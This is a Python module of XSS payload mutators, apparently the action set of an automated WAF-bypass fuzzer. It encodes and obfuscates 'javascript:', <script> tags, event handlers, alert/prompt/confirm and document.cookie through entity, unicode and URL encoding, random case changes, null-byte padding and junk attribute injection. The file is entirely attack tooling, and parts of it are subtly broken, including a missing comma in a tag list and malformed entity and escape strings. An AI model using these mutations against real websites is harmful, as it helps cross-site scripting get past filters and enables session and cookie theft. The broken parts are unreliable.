import re
import time
import random
flag = False


# 0
def modify_js1(data):
    re_type1 = r'[\w\.=&\'\(\)%\/+\\]+[^"><]javascript:.*'
    re_type2 = r'.*<script>.*'
    result1 = re.match(re_type1, data, re.DOTALL)
    result2 = re.match(re_type2, data, re.DOTALL)
    if result1 is not None and result2 is None:
        new_data = data.replace('javascript', 'ja&Tab;vasc&#x09;ript')
        return True, new_data
    return False, data


# 1
def modify_js2(data):
    re_type1 = r'[\w\.=&\'\(\)%\/+\\]+[^"><]javascript:.*'
    re_type2 = r'.*<script>.*'
    result1 = re.match(re_type1, data, re.DOTALL)
    result2 = re.match(re_type2, data, re.DOTALL)
    if result1 is not None and result2 is None:
        new_data = data.replace('javascript', 'jav&colon;ascr&#x0A;ipt')
        return True, new_data
    return False, data


# 2
def modify_js3(data):
    re_type1 = r'[\w\.=&\'\(\)%\/+\\]+[^"><]javascript:.*'
    re_type2 = r'.*<script>.*'
    result1 = re.match(re_type1, data, re.DOTALL)
    result2 = re.match(re_type2, data, re.DOTALL)
    if result1 is not None and result2 is None:
        new_data = data.replace('javascript', 'javas&NewLine;cri&#x3A;pt')
        return True, new_data
    return False, data


# 3
def modify_js4(data):
    re_type1 = r'[\w\.=&\'\(\)%\/+\\]+[^"><]javascript:.*'
    re_type2 = r'.*<script>.*'
    result1 = re.match(re_type1, data, re.DOTALL)
    result2 = re.match(re_type2, data, re.DOTALL)
    if result1 is not None and result2 is None:
        new_data = data.replace('javascript', 'javasc&#x0D;ript')
        return True, new_data
    return False, data


# 4
def case_conversion(data):
    label = ['abbr', 'address', 'acronym', 'applet', 'area', 'article', 'aside', 'audio', 'base', 'basefont', 'big',
             'ondrop',
             'body', 'button', 'canvas', 'caption', 'center', 'colgroup', 'command', 'data', 'datalist', 'details',
             'dialog',
             'div', 'embed', 'fieldset', 'figcaption', 'figure', 'font', 'footer', 'form', 'frame', 'frameset',
             'header', 'iframe',
             'img', 'input', 'keygen', 'label', 'legend', 'link', 'main', 'map', 'mark', 'menu', 'menuitem', 'meter',
             'noframes',
             'noscript', 'object', 'optgroup', 'option', 'output', 'param', 'picture', 'progress', 'samp', 'script',
             'section',
             'select', 'small', 'source', 'span', 'strike', 'strong', 'style', 'summarry', 'svg', 'table', 'tbody',
             'template', 'listing', 'marque', 'meta', 'multicol', 'nav', 'nexitid',  'nobr', 'plaintext', 'strong',
             'xmp' 'textarea', 'tfoot', 'thead', 'time', 'title', 'track', 'video', 'onafterprint', 'onbeforeprint',
             'onbeforeunload',  'onerror', 'onhaschange', 'onload', 'onmessage', 'onoffline', 'ononline', 'onpagehide',
             'onpageshow', 'blockquote', 'onpopstate', 'onredo', 'onresize', 'onstorage', 'onundo', 'onunload', 'onblur',
             'onchange', 'oncontextmenu', 'onfocus', 'onformchange', 'onforminput', 'oninput', 'oninvalid', 'onreset',
             'onselect', 'onsubmit', 'onkeydown', 'onkeypress','onkeyup', 'onclick', 'ondblclick', 'ondrag', 'ondragend',
             'ondragenter', 'ondragleave', 'ondragover', 'ondragstart','onmousedown', 'onmousemove', 'onmouseout',
             'onmouseover', 'onmouseup', 'onmousewheel', 'onscroll', 'onabort', 'oncanplay', 'oncanplaythrough',
             'ondurationchange', 'onemptied', 'onended', 'onerror', 'onloadeddata','onloadedmetadata', 'onloadstart',
             'onpause', 'onplay', 'onplaying', 'onprogress', 'onratechange', 'onreadystatechange', 'onseeked',
             'onseeking', 'onstalled', 'onsuspend', 'ontimeupdate', 'onvolumechange', 'onwaiting', 'onbeforecopy']
    new_data = data
    for item in label:
        if item in new_data:
            length = len(item)
            text = item
            for i in range((length // 2) + 1):
                rand = random.randint(0, length - 1)
                while str(text[rand]).isupper():
                    rand = random.randint(0, length - 1)
                temp = str(text[rand]).upper()
                text = text[0:rand] + temp + text[rand + 1:]
            new_data = new_data.replace(item, text)
    if new_data == data:
        return False, new_data
    return True, new_data


# 5
def null_byte_injection2(data):
    re_type = r'.*<script>.*'
    result = re.match(re_type, data, re.DOTALL)
    if result is not None:
        new_data = data.replace('<script>', '<script/sgbdhrehbv/>')
        new_data = new_data.replace('</script>', '</script/sgbdhrehbv/>')
        return True, new_data
    return False, data


# 6
def insert_str(data):
    arr = ['Adoption_Campaign_memorydb-customer-hero', 'awssm-9102_pac_defaultindustries', 'PaaS_Digital_Marketingsolutio_dkfmr78945gtjgnuns',
           'ha_a134p00000AAG~ha_awssm-9102_pac_defaultpac_RTA_hannels_memorydb_2021', 'Other_w39y21hero-DataHPGlobal_Marketing_Campaigns',
           'ha_a134pAAW~ha_awssm-9277_pac_defaulttopnav2-btn-ft', 'GLBL-FY21-Q3-GC-600-AWS-Data-Page', 'ha_a134p0NXLAA4~ha-9105_pac_default',
           'NA-FY21-PZ-CNTCENT-Contact-UberFlip-CCDawssm-4028_default',
           'grizzly_getting-started-center_default-ed', 'ha_awssm-everASCDREgreen-default*all#__Find_an_AWS_Customer_Story',
           'launch_4028_remote-_default-ed&sc_ichannel=ha', 'pac-edm-2020-lightsail-free-page-test', 'Enterprise_Digital_Marketing&sc_iplace=ed',
           'Adoption_Campaign_default-ed_20202707', 'custome8752368jgngjt===rstorieshybridout', 'tem.additionalFields.sortDateaware_analyst_reports',
           'industry%23digital-marketingaware_aws-training', 'ha_reports-default-editorial-lowerawssm-evergreen-default-editorial-lower',
           'awssm-1749-default-editorial-lowerha_awssm-6762_aware', 'awssm-6762_awarefooter-signin-mobilemobi1-btn-ft',
           'login_register_header_landinglogin_register_center',
           'trail-fgrbhjjb-ghead_corpweb-nav-learning-link', '7010M000002QRgjQAGsalesforce_propertiescovid_resources_trailmix',
           'eb1-txt-df2u-678hfnvneuh-ikm90jumbo3-txt-seehow', 'jumbo2-btn-demo-fnrung67854fjnjumbo1-btn-ft',
           'jumbo4-img-c360-456$%7gfjfooter_cookies_notice',
           'www.mozilla.orgbgnjyt=+++dfj35app-store-banner', 'who-we-are89086gtmh_gfntjdfnuebillboardsdef-tghth-frftg',
           'ya_d_l_cookie_prefs-hfbeyhbvjngffooter_privacy_kgmtjbnfrh', 'cash-offer-topnav-ght-fgtbhyjuportal_banner_cpp',
           'z360-sell-topnav_fgntjb-thtyh==hjZ_Mortgagestopnav_fbryvngru','paw_ntfinder_subnav-advertising_ullltr_home_tpnv_price-my-rental_677899jfg',
           'postbutton_sitenav_frimmvrn_12484_rfkltr_zw_post-a-listing_kgkmrtubn_kghtn',
           'postbutton_topnav_123456_fgnrutglist_zrm_topnav_4128ngru14588']
    re_type = r'.*\s.*'
    result = re.match(re_type, data, re.DOTALL)
    seed = int(time.time())
    if result is not None:
        random.seed(seed)
        d = random.sample(arr, 1)[0] + '<="f" '
        d = ' ' + d
        new_data = data.replace(' ', d, 3)
        return True, new_data
    return False, data


# 7
def double(data):
    attr = ['abbr', 'address', 'acronym', 'applet', 'area', 'article', 'aside', 'audio', 'base', 'basefont', 'big',
            'ondrop', 'body', 'button', 'canvas', 'caption', 'center', 'colgroup', 'command', 'data', 'datalist',
            'details', 'dialog', 'div', 'embed', 'fieldset', 'figcaption', 'figure', 'font', 'footer', 'form',
            'frame', 'frameset', 'header',  'iframe', 'img', 'input', 'keygen', 'label', 'legend', 'link', 'main',
            'map', 'mark', 'menu', 'menuitem', 'meter', 'noframes', 'noscript', 'object', 'optgroup', 'option',
            'output', 'param', 'picture', 'progress', 'samp', 'script', 'section', 'select', 'small', 'source',
            'span', 'strike', 'strong', 'style', 'summarry', 'svg', 'table', 'tbody', 'template', 'textarea', 'tfoot',
            'thead', 'time', 'title', 'track', 'video', 'listing', 'marque', 'meta', 'multicol', 'nav', 'nexitid',
            'nobr', 'plaintext', 'strong', 'xmp']
    new_data = data
    global flag
    if flag:
        return False, new_data
    for item in attr:
        if item in data:
            double_attr = item[:len(item)//2] + item + data[len(item)//2:]
            new_data = new_data.replace(item, double_attr)
            flag = True
    return True, new_data


# 8
# def space_mutation1(data):
#     re_type = r'.*\s.*'
#     result = re.match(re_type, data, re.DOTALL)
#     if result is not None:
#         new_data = data.replace(' ', '/', 2)
#         return True, new_data
#     return False, data


# 9
def space_mutation2(data):
    re_type = r'.*\s.*'
    result = re.match(re_type, data, re.DOTALL)
    if result is not None:
        new_data = data.replace(' ', '%09%00%0A%00%0C%0D%00%0B%0C%0A%00%OD%00%0C', 3)
        return True, new_data
    return False, data


# 10
# def backet(data):
#     re_type = r'.*\(.*\).*'
#     result = re.match(re_type, data, re.DOTALL)
#     if result is not None:
#         new_data = data.replace('(', '`')
#         new_data = new_data.replace(')', '`')
#         return True, new_data
#     return False, data


# 11
def alert_confirm(data):
    re_type = r'.*alert.*'
    result = re.match(re_type, data, re.DOTALL)
    if result is not None:
        new_data = data.replace('alert', 'confirm')
        return True, new_data
    return False, data


# 12
# def de_quotation(data):
#     re_type = r'.*"[^>].*".*".*'
#     result = re.match(re_type, data, re.DOTALL)
#     if result is not None:
#         flag = False
#         new_data = []
#         for i in range(len(data) - 1):
#             if flag is True and data[i] == "'":
#                 new_data.append('')
#             else:
#                 new_data.append(data[i])
#             if data[i] == "'" and data[i + 1] == '>':
#                 flag = True
#         new_data.append(data[-1])
#         return True, ''.join(new_data)
#     return False, data


# 12
def html_entity_encode(data):
    re_type = r'.*<script>.*'
    result = re.match(re_type, data, re.DOTALL)
    if result is None:
        new_data = data.replace('javascript:',
                                '&#000106&#000097&#000118&#000097&#000115&#000099&#000114&#000105&#000112&#000116&#000058')
        new_data = new_data.replace('ja&Tab;vasc&#x09;ript:',
                                    '&#000106&#000097&Tab;&#000118&#000097&#000115&#000099&#x009;&#000114&#000105&#000112&#000116&#000058')
        new_data = new_data.replace('jav&colon;ascr&#x0A;ipt:',
                                    '&#000106&#000097&#000118&colon;&#000097&#000115&#000099&#000114&#x0A;&#000105&#000112&#000116&#000058')
        new_data = new_data.replace('javas&NewLine;cri&#x3A;pt:',
                                    '&#000106&#000097&#000118&#000097&#000115&NewLine;&#000099&#000114&#000105&#x3A;&#000112&#000116&#000058')
        new_data = new_data.replace('javasc&#x0D;ript:',
                                    '&#000106&#000097&#000118&#000097&#000115&#000099&#x0D;&#000114&#000105&#000112&#000116&#000058')
        new_data = new_data.replace('alert', '&#000097&#000108&#000101&#000114&#000116')
        new_data = new_data.replace('prompt', '&#000112&#000114&#000111&#000109&#000112&#000116')
        new_data = new_data.replace('confirm', '&#000099&#000111&#000110&#000102&#000105&#000114&#000109')
        new_data = new_data.replace('document.cookie',
                                    '&#000100&#000111&#000099&#000117&#000109&#000101&#000110&#000116&#000046&#000099&#000111&#000111&#000107&#000105&#000101')
        new_data = new_data.replace('data:', '&#000100&#000097&#000116&#000097&#000058')
        new_data = new_data.replace('http:', '&#000104&#0000116&#000116&#000112&#000058')
        new_data = new_data.replace('(', '&#000040;')
        new_data = new_data.replace(')', '&#000041;')
        return True, new_data
    return False, data


# 13
def encode_protocol(data):
    re_type = r'.*javascript:.*|.*data:.*|.*http:.*'
    result = re.match(re_type, data, re.DOTALL)
    if result is not None:
        new_data = data.replace('javascript:',
                                '&#000106&#000097&#000118&#000097&#000115&#000099&#000114&#000105&#000112&#000116&#000058')
        new_data = new_data.replace('data:', '&#000100&#000097&#000116&#000097&#000058')
        new_data = new_data.replace('http:', '&#000104&#0000116&#000116&#000112&#000058')
        return True, new_data
    return False, data


# 14
def unicode_encode(data):
    re_type = r'.*alert.*|.*prompt.*|.*confirm.*'
    result = re.match(re_type, data, re.DOTALL)
    if result is not None:
        new_data = data.replace('alert', '\\u0061\\u006c\\u0065\\u0072\\u0074')
        new_data = new_data.replace('prompt', '\\u0070\\u0072\\u006f\\u006d\\u0070\\u0074')
        new_data = new_data.replace('confirm', '\\u0063\\u006f\\u006e\\u0066\\u0069\\u0072\\u006d')
        return True, new_data
    return False, data


# 15
def url_encode(data):
    re_type = r'.*alert.*|.*prompt.*|.*confirm.*'
    result = re.match(re_type, data, re.DOTALL)
    if result is not None:
        new_data = data.replace('alert', '%2561%256C%2565%2572%2574')
        new_data = new_data.replace('prompt', '%2570%2572%256F%256D%2570%2574')
        new_data = new_data.replace('confirm', '%2563%256F%256E%2566%2569%2572%256D')
        return True, new_data
    return False, data


# 16
def append_str(data):
    arr = ['zh-TW-GAZAmgQ-googlemenureferral.google.com', 'homepage-google-HKreferral-hp-footer',
           'google_hpafooter-ytgenLeftNav_ws_results_helpythp',
           '.ldefvf.grtg.ist.pc_1_searnewr20110530btop_a220m.100d100', 'vjfgnru_34jgtn-filimo-userfbehy=gu330100#J_crumbs',
           'cdfhnhe==fgrjn=mallpc_1_seabutton','sn_1_rightnav_dfhnrh-45hrh4y5h#$%fry==9075994#J_crumbs',
           'cbdfb+fhru--sn_1_rightnavCXED=97BYG57-5F1B69AAE7DB0',
           'baidu-top-pcindex_entryroyal_blue_barja_JP','fp_trough==Frontpage_desktopamexexplorerYahoo',
           'pc_nativelearnivip_sy_hyjxportalRTE2021portalFooter', 'orgwikipediaZ9LH3BHEA000O16_BingHPGAZAmgQ',
           'googlemenu89-bannerytmh_p2c_weby_010017ytmh',  'g_1000298236ExpiredDomainktextlink438_O_top_ALL',
           'web_leftcolumnj_as_ya_tc_nCNavAppsWindowsAppsgSYa2NXf',
           'ytc_pc_ikyuy_010002demaecantopAir_ytop_pcY00', 'contentpcsvcyahoo_contentboxjob_detaillef',
           'NBG12621ywww_pp_top_pc1param%253Dytoppostmessage',
           'aparat-sidebarsidebar-linkOCS_marriage_2021', 'sidebarsidebar_eventsearch_july21stcolumnyj_leftcolumn',
           'sidebar_sportsmainpage_headerhp_orangeOPS_',
           'yare_komak_darsi_aphealth.mail.ruMourir-attendre_2021', 'StripeOCIDxoqYgl4JDe8zhhk_mipe_oice',
           'MSNMAPzhhk_metripe_storeAABr7VLrubrique_cine', 'BBqiXNiAAaviU3AAavKXBBBqiVh1MSN_OnNote_TopMenu',
           'AAnbUEtAAiT7juAAnbZIyAAnc2s00_EiwD52_O6EESUKwuw8',
           'BBuYl6Ytt_offial_site_gucenv_mv_cal', 'Atiktok_webAIcSJZtiktok_webmailruhgk', 'mainpage_promoGAZAmgQauth.mail.ru0y12-29wprodu',
           '3149785_store48VKJOB_b1anonymMainiPhone12ProMax', 'widgetToolbar_ChangeLang_first_positionct|best',
           'nv_tvv_dvdvw_uebersichtsseitespm57398asdeortmail.ru', 'Samsungloisirs_divertmentstelephoneselectronique',
           'immobiliervoyagestelephonie_accessoires', 'informatiquepieces_detahp_minor_pos22sberbankru',
           'accessoires_modemateriaux_equment', 'loisirs_divertistscosmetiques', 'top_accueilwsjheaderhp_lead_pos1',
           'hp_trend_article_pos1CP_PRT_BRD_FTR', 'wsjfooterwsj.reader_spbigscrren--link']
    seed = int(time.time())
    random.seed(seed)
    new_data = data
    d = random.sample(arr, 1)[0]
    d = '<' + d + '= '
    re_type = r'<.*>.*'
    result = re.match(re_type, data, re.DOTALL)
    if result is not None:
        new_data = d + new_data
        return True, new_data
    return False, new_data


def action_payload(action, data):
    if action == 0:
        return modify_js1(data)
    if action == 1:
        return modify_js2(data)
    if action == 2:
        return modify_js3(data)
    if action == 3:
        return modify_js4(data)
    if action == 4:
        return case_conversion(data)
    if action == 5:
        return null_byte_injection2(data)
    if action == 6:
        return insert_str(data)
    if action == 7:
        return double(data)
    if action == 8:
        return space_mutation2(data)
    if action == 9:
        return alert_confirm(data)
    if action == 10:
        return html_entity_encode(data)
    if action == 11:
        return encode_protocol(data)
    if action == 12:
        return unicode_encode(data)
    if action == 13:
        return url_encode(data)
    if action == 14:
        return append_str(data)

# data = '<avxbsye onerror=alert(123)>eruv onloadeddata'
# new = case_conversion(data)
# print(new)
# print(append_str(data))
